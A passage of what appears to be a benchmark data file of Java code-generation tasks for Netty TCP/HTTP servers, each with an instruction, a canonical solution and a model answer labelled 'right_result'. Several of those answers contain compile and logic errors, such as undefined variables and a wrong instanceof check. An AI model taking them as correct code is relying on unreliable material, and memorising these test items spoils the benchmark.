pipeline.addLast(\"channel_manage\", channelManage);\n                    pipeline.addLast(\"decoder\", new NettyDecoder(codec, NettyServer.this, maxContentLength));\n                    pipeline.addLast(\"encoder\", new NettyEncoder());\n                    pipeline.addLast(\"handler\", new NettyChannelHandler(NettyServer.this, messageHandler, standardThreadExecutor));\n                }\n            });\n        serverBootstrap.childOption(ChannelOption.TCP_NODELAY, true);\n        serverBootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(url.getPort()));\n        channelFuture.syncUninterruptibly();\n        serverChannel = channelFuture.channel();\n        setLocalAddress((InetSocketAddress) serverChannel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n\n        state = ChannelState.ALIVE;\n        LoggerUtil.info(\"NettyServer ServerChannel finish Open: url=\" + url);\n        return state.isAliveState();\n    }\n\n    @Override\n    public synchronized void close() {\n        if (state.isCloseState()) {\n            return;\n        }\n\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (bossGroup != null) {\n                bossGroup.shutdownGracefully();\n                bossGroup = null;\n            }\n            if (workerGroup != null) {\n                workerGroup.shutdownGracefully();\n                workerGroup = null;\n            }\n            if (channelManage != null) {\n                channelManage.close();\n            }\n            if (standardThreadExecutor != null) {\n                standardThreadExecutor.shutdownNow();\n            }\n\n            state = ChannelState.CLOSE;\n            LoggerUtil.info(\"NettyServer close Success: url={}\", url.getUri());\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyServer close Error: url=\" + url.getUri(), e);\n        }\n    }\n\n    @Override\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws TransportException {\n        throw new MotanFrameworkException(\"NettyServer request(Request request) method not support: url: \" + url);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class NettyServer extends AbstractServer {\n    private NioEventLoopGroup bossGroup;\n    private NioEventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter;\n    private NettyServerChannelManage channelManage;\n\n    public boolean open(URL url, MessageHandler messageHandler) {\n        this.messageHandler = messageHandler;\n        // Initialize thread pools and other attributes\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup(url.getIntParameter(\"workerThreads\", 16));\n        standardThreadExecutor = new StandardThreadExecutor(url.getIntParameter(\"queueSize\", 1024));\n        channelManage = new NettyServerChannelManage();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new MessageDecoder());\n                     p.addLast(new MessageEncoder());\n                     p.addLast(messageHandler);\n                 }\n             });\n\n            serverChannel = b.bind(url.getPort()).sync().channel();\n            return true;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return false;\n        }\n    }\n\n    public void close() {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n        standardThreadExecutor.shutdown();\n        channelManage.shutdown();\n    }\n\n    public boolean isBound() {\n        return serverChannel != null && serverChannel.isActive();\n    }\n\n    @Override\n    public Response request(Request request) throws MotanFrameworkException {\n        throw new MotanFrameworkException(\"Direct request not supported\");\n    }\n}\n```"
  },
  {
    "Task_id": 210,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests. The server should be configurable to listen on a specified port and properly manage its resources.\n\nClass Description: HttpServer is a Netty-based TCP server implementation that handles HTTP requests. It manages server lifecycle including startup, shutdown, and resource cleanup. The server uses a boss-worker thread model for handling connections and requests efficiently.\n\nAttributes:\n- DEFAULT_PORT: int - The default port (8080) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent thread group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child thread group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server configuration and startup helper class\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port. Initializes thread groups, configures server options, and binds to the port. Throws Exception if startup fails.\n- stop() -> void - Shuts down the server gracefully by releasing all thread resources\n- main(String[] args) -> void - Entry point that parses command line arguments for port number and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HttpServer {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public void start(int port) throws Exception {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new HttpServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HttpServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        HttpServer server = new HttpServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\n\npublic class HttpServer {\n    private static final int DEFAULT_PORT = 8080;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public void start(int port) throws Exception {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        try {\n            bootstrap = new ServerBootstrap()\n                    .group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            // Add more handlers as needed\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        HttpServer server = new HttpServer();\n        try {\n            server.start(port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with configurable thread pools and graceful shutdown capabilities.\n\nClass Description: NettySourceHttpServer is a TCP server implementation using Netty framework that handles HTTP requests. It manages server lifecycle (initialization, startup, shutdown) and uses configurable thread pools for handling connections. The server can be initialized with specific query registry and event subject for request processing.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- bossGroup: [NioEventLoopGroup] - Accepts incoming connections with configurable thread count\n- nettyServerRunnable: [Runnable] - Contains the server startup logic\n- isInitialized: [boolean] - Tracks whether the server has been initialized\n- isStarted: [boolean] - Tracks whether the server is running\n\nMethods:\n- [Constructor]([Context context, int threadCount]) -> [void] - Initializes bossGroup with specified thread count and workerGroup with default settings\n- init([QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port]) -> [void] - Configures server bootstrap with HTTP handlers and binding port if not already initialized\n- startServer() -> [void] - Starts the server in a separate thread if initialized but not running, adds shutdown hook\n- shutdownServer() -> [void] - Gracefully shuts down server resources if initialized and running",
    "Canonical_solution": "import io.mantisrx.connector.publish.core.QueryRegistry;\nimport io.mantisrx.runtime.Context;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.subjects.Subject;\n\npublic class NettySourceHttpServer implements SourceHttpServer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NettySourceHttpServer.class);\n\n    private final NioEventLoopGroup workerGroup;\n    private final NioEventLoopGroup bossGroup;\n\n    private Runnable nettyServerRunnable;\n    private volatile boolean isInitialized = false;\n    private volatile boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n    }\n\n    @Override\n    public void init(QueryRegistry queryRegistry, Subject<String, String> eventSubject, int port) {\n        if (!isInitialized) {\n            nettyServerRunnable = () -> {\n                try {\n                    ServerBootstrap b = new ServerBootstrap();\n                    b.option(ChannelOption.SO_BACKLOG, 1024);\n                    b.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new HttpServerInitializer(queryRegistry, eventSubject));\n                    Channel ch = b.bind(port).sync().channel();\n                    ch.closeFuture().sync();\n                } catch (Exception e) {\n                    LOGGER.error(e.getMessage());\n                } finally {\n                    bossGroup.shutdownGracefully();\n                    workerGroup.shutdownGracefully();\n                }\n            };\n\n            isInitialized = true;\n        }\n    }\n\n    @Override\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            ExecutorService executor = Executors.newSingleThreadExecutor();\n            executor.submit(nettyServerRunnable);\n\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n\n            isStarted = true;\n        } else {\n            throw new IllegalStateException(\"Server already started\");\n        }\n    }\n\n    @Override\n    public void shutdownServer() {\n        if (isInitialized && isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport org.reactivestreams.Subscriber;\n\npublic class NettySourceHttpServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Runnable nettyServerRunnable;\n    private boolean isInitialized = false;\n    private boolean isStarted = false;\n\n    public NettySourceHttpServer(Context context, int threadCount) {\n        this.bossGroup = new NioEventLoopGroup(threadCount);\n        this.workerGroup = new NioEventLoopGroup();\n        this.nettyServerRunnable = () -> {\n            try {\n                ServerBootstrap b = new ServerBootstrap();\n                b.group(bossGroup, workerGroup)\n                 .channel(NioServerSocketChannel.class)\n                 .childHandler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) throws Exception {\n                         ChannelPipeline p = ch.pipeline();\n                         p.addLast(new HttpResponseEncoder());\n                         p.addLast(new HttpRequestDecoder());\n                         p.addLast(new HttpObjectAggregator(65536));\n                         // Add custom handler here\n                     }\n                 });\n                // Bind and start to accept incoming connections.\n                ChannelFuture f = b.bind(context.port).sync();\n                f.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            } finally {\n                workerGroup.shutdownGracefully();\n                bossGroup.shutdownGracefully();\n            }\n        };\n    }\n\n    public void init(QueryRegistry queryRegistry, Subscriber<String> eventSubject, int port) {\n        if (!isInitialized) {\n            ((Context) queryRegistry).port = port;\n            isInitialized = true;\n        }\n    }\n\n    public void startServer() {\n        if (isInitialized && !isStarted) {\n            new Thread(nettyServerRunnable).start();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::shutdownServer));\n            isStarted = true;\n        }\n    }\n\n    public void shutdownServer() {\n        if (isStarted) {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            isStarted = false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections with non-blocking I/O operations.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nConstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, configures Netty components, and begins listening for connections\nmain: main(String[] args) -> void - Entry point that creates and starts the server instance, using port 8080 by default or a specified port from command line arguments",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        } else {\n            port = 8080;\n        }\n        new TimeServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class TimeServer {\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new TimeServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new TimeServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Implement a Netty-based TCP server for handling remote commands with connection management and idle state detection.\n\nClass Description: NettyRemotingServer is a TCP server implementation using Netty framework that handles incoming remote commands, manages client connections, and provides event notification for connection changes. It supports configurable thread pools, connection idle detection, and custom channel event handling.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for server configuration\n- bossSelectorGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerSelectorGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- defaultEventExecutorGroup: DefaultEventExecutorGroup - Thread pool for business logic processing\n- appContext: AppContext - Application context for dependency injection\n- LOGGER: Logger - Logger instance for server operations logging\n\nMethods:\n- NettyRemotingServer(AppContext, RemotingServerConfig) -> void - Constructor with application context and server configuration\n- NettyRemotingServer(RemotingServerConfig, ChannelEventListener) -> void - Constructor with server configuration and channel event listener\n- serverStart() -> void - Starts the Netty server, initializes thread pools and configures server bootstrap\n- serverShutdown() -> void - Shuts down the server gracefully, releasing all resources\n- NettyServerHandler: channelRead0(ChannelHandlerContext, RemotingCommand) -> void - Handles incoming message processing\n- NettyConnectManageHandler: channelRegistered(ChannelHandlerContext) -> void - Logs channel registration events\n- NettyConnectManageHandler: channelUnregistered(ChannelHandlerContext) -> void - Logs channel unregistration events\n- NettyConnectManageHandler: channelActive(ChannelHandlerContext) -> void - Handles new active connections\n- NettyConnectManageHandler: channelInactive(ChannelHandlerContext) -> void - Handles connection close events\n- NettyConnectManageHandler: userEventTriggered(ChannelHandlerContext, Object) -> void - Handles idle state events\n- NettyConnectManageHandler: exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.factory.NamedThreadFactory;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.remoting.*;\nimport com.github.ltsopensource.remoting.common.RemotingHelper;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport com.github.ltsopensource.remoting.protocol.RemotingCommand;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\n\npublic class NettyRemotingServer extends AbstractRemotingServer {\n\n    public static final Logger LOGGER = AbstractRemotingServer.LOGGER;\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private AppContext appContext;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n        this.appContext = appContext;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig remotingServerConfig, final ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(1, new NamedThreadFactory(\"NettyBossSelectorThread_\"));\n        this.workerSelectorGroup = new NioEventLoopGroup(remotingServerConfig.getServerSelectorThreads(), new NamedThreadFactory(\"NettyServerSelectorThread_\", true));\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        NettyLogger.setNettyLoggerFactory();\n\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(\n                remotingServerConfig.getServerWorkerThreads(),\n                new NamedThreadFactory(\"NettyServerWorkerThread_\")\n        );\n\n        final NettyCodecFactory nettyCodecFactory = new NettyCodecFactory(appContext, getCodec());\n\n        this.serverBootstrap.group(this.bossSelectorGroup, this.workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 65536)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .localAddress(new InetSocketAddress(this.remotingServerConfig.getListenPort()))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                defaultEventExecutorGroup,\n                                nettyCodecFactory.getEncoder(),\n                                nettyCodecFactory.getDecoder(),\n                                new IdleStateHandler(remotingServerConfig.getReaderIdleTimeSeconds(),\n                                        remotingServerConfig.getWriterIdleTimeSeconds(), remotingServerConfig.getServerChannelMaxIdleTimeSeconds()),\n                                new NettyConnectManageHandler(),\n                                new NettyServerHandler());\n                    }\n                });\n\n        try {\n            this.serverBootstrap.bind().sync();\n        } catch (InterruptedException e) {\n            throw new RemotingException(\"Start Netty server bootstrap error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        this.bossSelectorGroup.shutdownGracefully();\n        this.workerSelectorGroup.shutdownGracefully();\n\n        if (this.defaultEventExecutorGroup != null) {\n            this.defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            processMessageReceived(new NettyChannel(ctx), msg);\n        }\n    }\n\n    class NettyConnectManageHandler extends ChannelDuplexHandler {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelRegistered {}\", remoteAddress);\n            super.channelRegistered(ctx);\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelUnregistered, the channel[{}]\", remoteAddress);\n            super.channelUnregistered(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelActive, the channel[{}]\", remoteAddress);\n            super.channelActive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CONNECT, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelInactive, the channel[{}]\", remoteAddress);\n            super.channelInactive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CLOSE, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n                final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n\n                if (event.state().equals(IdleState.ALL_IDLE)) {\n                    LOGGER.warn(\"SERVER: IDLE [{}]\", remoteAddress);\n                    RemotingHelper.closeChannel(channel);\n                }\n\n                if (channelEventListener != null) {\n                    RemotingEventType remotingEventType = RemotingEventType.valueOf(event.state().name());\n                    putRemotingEvent(new RemotingEvent(remotingEventType, remoteAddress, channel));\n                }\n            }\n            ctx.fireUserEventTriggered(evt);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.warn(\"SERVER: exceptionCaught {}\", remoteAddress, cause);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.EXCEPTION, remoteAddress, channel));\n            }\n\n            RemotingHelper.closeChannel(channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyRemotingServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private final DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private final AppContext appContext;\n    private static final Logger LOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig config) {\n        this.appContext = appContext;\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(config.getBossThreads());\n        this.workerSelectorGroup = new NioEventLoopGroup(config.getWorkerThreads());\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getBusinessThreads());\n    }\n\n    public NettyRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        this(null, config, listener);\n    }\n\n    public void serverStart() {\n        serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(60, 30, 0));\n                        pipeline.addLast(\"nettyConnectManageHandler\", new NettyConnectManageHandler(appContext));\n                        pipeline.addLast(\"defaultEventExecutorGroup\", defaultEventExecutorGroup);\n                        pipeline.addLast(\"nettyServerHandler\", new NettyServerHandler(appContext));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = serverBootstrap.bind(config.getPort()).syncUninterruptibly();\n        if (future.isSuccess()) {\n            LOGGER.info(\"Netty server started on port {}\", config.getPort());\n        } else {\n            LOGGER.error(\"Failed to start Netty server\", future.cause());\n        }\n    }\n\n    public void serverShutdown() {\n        if (serverBootstrap != null) {\n            serverBootstrap.config().group().shutdownGracefully();\n            serverBootstrap.config().childGroup().shutdownGracefully();\n            defaultEventExecutorGroup.shutdownGracefully();\n            LOGGER.info(\"Netty server shut down\");\n        }\n    }\n\n    // Inner classes for handlers\n    private static class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        private final AppContext appContext;\n\n        public NettyServerHandler(AppContext appContext) {\n            this.appContext = appContext;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Handle incoming message processing\n        }\n    }\n\n    private static class NettyConnectManageHandler extends ChannelDuplexHandler {\n        private final AppContext appContext;\n\n        public NettyConnectManageHandler(AppContext appContext) {\n            this.appContext = appContext;\n        }\n\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            LOGGER.info(\"Channel registered: {}\", ctx.channel());\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            LOGGER.info(\"Channel unregistered: {}\", ctx.channel());\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            LOGGER.info(\"New active connection: {}\", ctx.channel());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            LOGGER.info(\"Connection closed: {}\", ctx.channel());\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateHandler) {\n                LOGGER.warn(\"Idle state detected for channel: {}\", ctx.channel());\n            }\n        }\n\n        @Override\n        public void 